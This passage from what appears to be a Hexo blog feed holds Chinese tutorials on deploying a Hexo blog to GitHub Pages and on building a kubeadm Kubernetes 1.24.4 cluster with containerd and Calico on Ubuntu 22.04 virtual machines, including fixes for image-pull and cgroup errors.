class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo server<br></code></pre></td></tr></table></figure><p>在浏览器访问server网址：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210143605.png"></p><p>可以看到自己刚刚新建的文章，第一篇笔记就弄好啦~</p><h2 id="推送到github网站-（github-pages）"><a href="#推送到github网站-（github-pages）" class="headerlink" title="推送到github网站 （github pages）"></a>推送到github网站 （github pages）</h2><h3 id="新建github-io"><a href="#新建github-io" class="headerlink" title="新建github.io"></a>新建github.io</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210150330.png"></p><h3 id="推送到github"><a href="#推送到github" class="headerlink" title="推送到github"></a>推送到github</h3><p>上面的操作是在自己的本地启动了hexo server，本质还是在本地浏览，我们可以选择把博客推送到github上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>修改blog根目录里的_config.yml文件</p><p>打开该文件，修改前：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210144448.png"></p><p>修改后：(增加deploy下面的内容)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210144628.png"></p><p>其实就是给hexo deploy 这个命令做相应的配置，让hexo知道你要把blog部署在哪个位置，很显然，我们部署在我们GitHub的仓库里。</p><p>执行：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo deploy</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153321.png"></p><p>hexo deploy需要输入用户名和密码，输了很多次都报错，后来查询资料了解到，<font color=red>密码那块可以输入github的token(重要)</font>。</p><p>token获取地方：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153525.png"><br>我用的是classic，还没有用过另外一个。</p><p>输入token之后，就能传上去了。如下：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153722.png"></p><p>传上来之后，github上面能看到这么多文件：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153844.png"></p><p>访问ningan123.github.io：<br><font color=red>（如果刚开始访问没有东西，建议等一会，一会就有了）</font></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210153958.png"></p><p>成功推送到github~</p><h3 id="推送到github-ssh方式-免密"><a href="#推送到github-ssh方式-免密" class="headerlink" title="推送到github(ssh方式 免密)"></a>推送到github(ssh方式 免密)</h3><p>新加一行文档，以和上一次做区分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hexo deploy git ssh&quot;</span> &gt;&gt; .\first.md<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155057.png"></p><p>修改blog根目录里的_config.yml文件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155300.png"></p><p>执行：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo deploy</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155350.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155410.png"></p><p>(因为我之前已经在github上面配置过ssh的key了，如果还没有配置，网上随便搜一下)</p><p>可以看到，这次推送就不用输入用户名和密码了~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210155834.png"></p><p>github上也已经更新了~</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/yaorongke/article/details/119089190"># GitHub Pages + Hexo搭建个人博客网站，史上最全教程</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202211) vmware中ubuntu22.04使用kubeadm安装k8s集群(1.24.4 or higher)(cka考试环境搭建)</title>
    <link href="/2022/11/28/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202211)%20vmware%E4%B8%ADubuntu22.04%E4%BD%BF%E7%94%A8kubeadm%E5%AE%89%E8%A3%85k8s%E9%9B%86%E7%BE%A4(1.24.4%20or%20higher)(cka%E8%80%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)/"/>
    <url>/2022/11/28/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202211)%20vmware%E4%B8%ADubuntu22.04%E4%BD%BF%E7%94%A8kubeadm%E5%AE%89%E8%A3%85k8s%E9%9B%86%E7%BE%A4(1.24.4%20or%20higher)(cka%E8%80%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)/</url>
    
    <content type="html"><![CDATA[<h2 id="部署环境准备"><a href="#部署环境准备" class="headerlink" title="部署环境准备"></a>部署环境准备</h2><p>ubuntu22.04虚拟机3台</p><h2 id="环境修改"><a href="#环境修改" class="headerlink" title="环境修改"></a>环境修改</h2><h3 id="修改hostname-各修改各的"><a href="#修改hostname-各修改各的" class="headerlink" title="修改hostname(各修改各的)"></a>修改hostname(各修改各的)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hostnamectl set-hostname k8s-master // master节点<br>hostnamectl set-hostname k8s-node1  // node1节点<br>hostnamectl set-hostname k8s-node2  // node2节点<br></code></pre></td></tr></table></figure><p>重启虚拟机，可以看到hostname已经生效了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121224048.png"></p><h3 id="修改hosts文件-master-和所有node"><a href="#修改hosts文件-master-和所有node" class="headerlink" title="修改hosts文件(master 和所有node )"></a>修改hosts文件(master 和所有node )</h3><p>修改&#x2F;etc&#x2F;hosts文件，添加下面内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt;&gt; /etc/hosts &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">192.168.1.100 k8s-master</span><br><span class="hljs-string">192.168.1.101 k8s-node1</span><br><span class="hljs-string">192.168.1.102 k8s-node2</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><h3 id="禁用swap-master-和所有node"><a href="#禁用swap-master-和所有node" class="headerlink" title="禁用swap(master 和所有node)"></a>禁用swap(master 和所有node)</h3><p>执行 <code>free -m</code> 命令检测: 如果Swap这一行不是0，则说明虚拟内存swap被开启了，需要关闭。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128223323.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo swapoff -a <br>sudo sed -i <span class="hljs-string">&#x27;/swap/ s/^\(.*\)$/#\1/g&#x27;</span> /etc/fstab <br><span class="hljs-comment"># -i 插入修改模式，g 标识符表示全局查找替换,表示注释掉swap的那一行。 free -h</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128224052.png"></p><h3 id="修改内核参数-master-和所有node"><a href="#修改内核参数-master-和所有node" class="headerlink" title="修改内核参数(master 和所有node )"></a>修改内核参数(master 和所有node )</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Enable kernel modules</span><br>sudo <span class="hljs-built_in">tee</span> /etc/modules-load.d/containerd.conf &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">overlay</span><br><span class="hljs-string">br_netfilter</span><br><span class="hljs-string">EOF</span><br>sudo modprobe overlay<br>sudo modprobe br_netfilter<br><br><br><br><span class="hljs-comment"># Add some settings to sysctl</span><br>sudo <span class="hljs-built_in">tee</span> /etc/sysctl.d/kubernetes.conf&lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="hljs-string">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="hljs-string">net.ipv4.ip_forward = 1</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment"># 重新加载 sysctl</span><br>sudo sysctl --system<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128223925.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128224007.png"></p><h2 id="安装-containerd"><a href="#安装-containerd" class="headerlink" title="安装 containerd"></a>安装 containerd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装关联软件</span><br>sudo apt install -y curl gnupg2 software-properties-common apt-transport-https ca-certificates<br><br><span class="hljs-comment"># 安装docker仓库</span><br>sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/docker.gpg<br>sudo add-apt-repository <span class="hljs-string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span><br><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128224741.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装containerd</span><br>sudo apt update <br>sudo apt install -y containerd.io<br><br><span class="hljs-comment"># 配置 containerd 用systemdcgroup启动.</span><br>containerd config default | sudo <span class="hljs-built_in">tee</span> /etc/containerd/config.toml &gt;/dev/null 2&gt;&amp;1<br>sudo sed -i <span class="hljs-string">&#x27;s/SystemdCgroup \= false/SystemdCgroup \= true/g&#x27;</span> /etc/containerd/config.toml<br><br><span class="hljs-comment"># 重启</span><br>sudo systemctl restart containerd <br>sudo systemctl <span class="hljs-built_in">enable</span> containerd<br></code></pre></td></tr></table></figure><p>可以看到containerd已经成功启动~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128225045.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置crictl</span><br><span class="hljs-built_in">cat</span> &gt; /etc/crictl.yaml &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">runtime-endpoint: unix:///var/run/containerd/containerd.sock</span><br><span class="hljs-string">image-endpoint: unix:///var/run/containerd/containerd.sock</span><br><span class="hljs-string">timeout: 10 </span><br><span class="hljs-string">debug: false</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128231055.png"></p><h2 id="安装k8s"><a href="#安装k8s" class="headerlink" title="安装k8s"></a>安装k8s</h2><h3 id="安装组件-master-和所有node"><a href="#安装组件-master-和所有node" class="headerlink" title="安装组件(master 和所有node )"></a>安装组件(master 和所有node )</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加apt repository for Kubernetes</span><br>curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | sudo apt-key add - <br>sudo apt-add-repository <span class="hljs-string">&quot;deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main&quot;</span><br><br>apt-get update<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看版本</span><br>apt-cache madison kubeadm|<span class="hljs-built_in">head</span><br><br>apt install -y kubelet=1.24.4-00 kubeadm=1.24.4-00 kubectl=1.24.4-00<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128230256.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128230511.png"></p><h3 id="下载镜像-master-和所有node"><a href="#下载镜像-master-和所有node" class="headerlink" title="下载镜像(master 和所有node )"></a>下载镜像(master 和所有node )</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用国内阿里云镜像站点，查看所需镜像</span><br>kubeadm config images list \<br>--image-repository registry.aliyuncs.com/google_containers \<br>--kubernetes-version=v1.24.4<br><br><span class="hljs-comment"># 指定版本下载</span><br>kubeadm config images pull \<br>--kubernetes-version=v1.24.4 \<br>--image-repository registry.aliyuncs.com/google_containers<br><br><span class="hljs-comment"># 查看镜像</span><br>crictl images<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128231425.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128231439.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128231505.png"></p><h3 id="集群配置-master"><a href="#集群配置-master" class="headerlink" title="集群配置(master)"></a>集群配置(master)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubeadm config <span class="hljs-built_in">print</span> init-defaults &gt; kubeadm.yaml<br></code></pre></td></tr></table></figure><p>修改集群配置如下：<br>左边为导出的原始文件，右边为修改后的文件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128233517.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># </span><br>kubeadm init \<br>--config /root/kubeadm.yaml \<br>--ignore-preflight-errors=SystemVerification \<br>--upload-certs<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128233301.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128233334.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">journalctl -xefu  kubelet</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128233638.png"></p><h3 id="集群配置2"><a href="#集群配置2" class="headerlink" title="集群配置2"></a>集群配置2</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128235322.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">kubeadm reset</span><br></code></pre></td></tr></table></figure><h3 id="集群配置3"><a href="#集群配置3" class="headerlink" title="集群配置3"></a>集群配置3</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128235403.png"></p><h3 id="集群配置4"><a href="#集群配置4" class="headerlink" title="集群配置4"></a>集群配置4</h3><p>journalctl -xefu kubelet 的报错信息如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">11月 28 23:24:10 k8s-master kubelet[24909]: E1128 23:24:10.831329   24909 remote_runtime.go:201] <span class="hljs-string">&quot;RunPodSandbox from runtime service failed&quot;</span> err=<span class="hljs-string">&quot;rpc error: code = Unknown desc = failed to get sandbox image \&quot;registry.k8s.io/pause:3.6\&quot;: failed to pull image \&quot;registry.k8s.io/pause:3.6\&quot;: failed to pull and unpack image \&quot;registry.k8s.io/pause:3.6\&quot;: failed to resolve reference \&quot;registry.k8s.io/pause:3.6\&quot;: failed to do request: Head \&quot;https://asia-east1-docker.pkg.dev/v2/k8s-artifacts-prod/images/pause/manifests/3.6\&quot;: dial tcp 108.177.125.82:443: connect: connection refused&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129005354.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129000309.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/containerd/config.toml  |grep image<br><br><span class="hljs-comment"># 替换</span><br>sed -i <span class="hljs-string">&quot;s#registry.k8s.io/pause:3.6#registry.aliyuncs.com/google_containers/pause:3.6#g&quot;</span>  /etc/containerd/config.toml<br><br><span class="hljs-comment"># 重启containerd</span><br>systemctl daemon-reload &amp;&amp; systemctl restart containerd<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 重新执行</span><br>kubeadm reset<br><br>kubeadm init \<br>--config /root/kubeadm.yaml \<br>--ignore-preflight-errors=SystemVerification \<br>--upload-certs<br></code></pre></td></tr></table></figure><h3 id="集群配置5"><a href="#集群配置5" class="headerlink" title="集群配置5"></a>集群配置5</h3><p>journalctl -xefu kubelet 的报错信息如下：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">11</span>月 <span class="hljs-number">29</span> <span class="hljs-number">00</span>:<span class="hljs-number">11</span>:<span class="hljs-number">19</span> k8s-master kubelet[<span class="hljs-number">42857</span>]: E1129 <span class="hljs-number">00</span>:<span class="hljs-number">11</span>:<span class="hljs-number">19.795996</span>   <span class="hljs-number">42857</span> <span class="hljs-comment">remote_runtime.go:201] &quot;RunPodSandbox from runtime service failed&quot; err=&quot;rpc error: code = Unknown desc = failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: expected cgroupsPath to be of format \&quot;slice:prefix:name\&quot; for systemd cgroups, got \&quot;/kubepods/burstable/pod444f719af02c349e8eca993c949ab6b9/eddc1ba340a885d45775c0bf4e1f634abf90ac1474ffea30ea6489ba5edd96ba\&quot; instead: unknown&quot;</span><br><br></code></pre></td></tr></table></figure><p>改回systemd</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129001515.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 重新执行</span><br>kubeadm reset<br><br>kubeadm init \<br>--config /root/kubeadm.yaml \<br>--ignore-preflight-errors=SystemVerification \<br>--upload-certs<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129001826.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129001854.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br>sudo <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="hljs-variable">$HOME</span>/.kube/config<br>sudo <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129001918.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 最终配置</span><br>[root@k8s-master ~]<span class="hljs-comment"># cat kubeadm.yaml</span><br>apiVersion: kubeadm.k8s.io/v1beta3<br>bootstrapTokens:<br>- <span class="hljs-built_in">groups</span>:<br>  - system:bootstrappers:kubeadm:default-node-token<br>  token: abcdef.0123456789abcdef<br>  ttl: 24h0m0s<br>  usages:<br>  - signing<br>  - authentication<br>kind: InitConfiguration<br>localAPIEndpoint:<br>  advertiseAddress: 192.168.1.100<br>  bindPort: 6443<br>nodeRegistration:<br>  criSocket: unix:///var/run/containerd/containerd.sock<br>  imagePullPolicy: IfNotPresent<br>  name: k8s-master<br>  taints: null<br>---<br>apiServer:<br>  timeoutForControlPlane: 4m0s<br>  certSANs:<br>  - 192.168.1.100<br>apiVersion: kubeadm.k8s.io/v1beta3<br>certificatesDir: /etc/kubernetes/pki<br>clusterName: kubernetes<br>controllerManager: &#123;&#125;<br>dns: &#123;&#125;<br>etcd:<br>  <span class="hljs-built_in">local</span>:<br>    dataDir: /var/lib/etcd<br>imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers<br>kind: ClusterConfiguration<br>kubernetesVersion: 1.24.4<br>networking:<br>  dnsDomain: cluster.local<br>  podSubnet: 10.244.0.0/16<br>  serviceSubnet: 10.96.0.0/12<br>scheduler: &#123;&#125;<br>---<br><span class="hljs-comment"># 指定cgroup</span><br>apiVersion: kubelet.config.k8s.io/v1beta1<br>kind: KubeletConfiguration<br>cgroupDriver: systemd<br><br></code></pre></td></tr></table></figure><h3 id="node节点"><a href="#node节点" class="headerlink" title="node节点"></a>node节点</h3><p>两个节点都执行如下方法：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/etc/</span>containerd/config.toml  |<span class="hljs-keyword">grep</span> image<br><br>sed -i <span class="hljs-string">&quot;s#registry.k8s.io/pause:3.6#registry.aliyuncs.com/google_containers/pause:3.6#g&quot;</span>  <span class="hljs-regexp">/etc/</span>containerd/config.toml<br><br>systemctl daemon-reload &amp;&amp; systemctl restart containerd<br><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">kubeadm <span class="hljs-keyword">join</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span>:<span class="hljs-number">6443</span> <span class="hljs-comment">--token abcdef.0123456789abcdef \</span><br>        <span class="hljs-comment">--discovery-token-ca-cert-hash sha256:3ce5d8f9fd07a09dd1625531de6876f3b41110c4e005a1c2b5470fbf074ab5cf</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129002345.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129002433.png"></p><p>集群安装成功~</p><h2 id="网络插件"><a href="#网络插件" class="headerlink" title="网络插件"></a>网络插件</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 使用calico</span><br><span class="hljs-attribute">curl</span> https://raw.githubusercontent.com/projectcalico/calico/v3.<span class="hljs-number">24</span>.<span class="hljs-number">1</span>/manifests/calico.yaml -o calico-<span class="hljs-number">3</span>-<span class="hljs-number">24</span>-<span class="hljs-number">1</span>.yaml<br><span class="hljs-attribute">kubectl</span> apply -f calico-<span class="hljs-number">3</span>-<span class="hljs-number">24</span>-<span class="hljs-number">1</span>.yaml<br></code></pre></td></tr></table></figure><p>部署完成之后多等一会，就会变成running了~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129002845.png"></p><p>node也全部都是ready了~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129003224.png"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl create deployment nginx <span class="hljs-attribute">--image</span>=nginx<br>kubectl <span class="hljs-built_in">get</span> pod<br>kubectl expose deployment nginx <span class="hljs-attribute">--port</span>=80 <span class="hljs-attribute">--type</span>=NodePort<br>kubectl <span class="hljs-built_in">get</span> pod,svc<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129003700.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221129003628.png"></p><h2 id="工具类学习"><a href="#工具类学习" class="headerlink" title="工具类学习"></a>工具类学习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;registry.k8s.io/pause:3.6&#x27;</span> /var/log/syslog<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/shelutai/article/details/126604857"># [最新]ubuntu22.04安装kubernetes1.25 k8s1.25</a> 前半部分配置<br><a href="https://blog.51cto.com/belbert/5872146">Ubuntu22.04 安装 K8S</a> 后半部分配置     kubeadm的config配置    ipvs配置</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>kubeadm</tag>
      
      <tag>ubuntu</tag>
      
      <tag>cka</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】(202211) VMware16.2.2中创建ubuntu22.04.1虚拟机+修改静态ip+换源+mobaxterm远程连接+修改命令提示符颜色(cka考试虚拟机搭建)</title>
